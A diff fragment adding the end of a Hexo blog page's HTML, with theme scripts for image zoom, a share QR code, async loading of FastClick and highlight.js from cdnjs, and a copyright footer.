+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      hljs.configure({useBR: true});
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
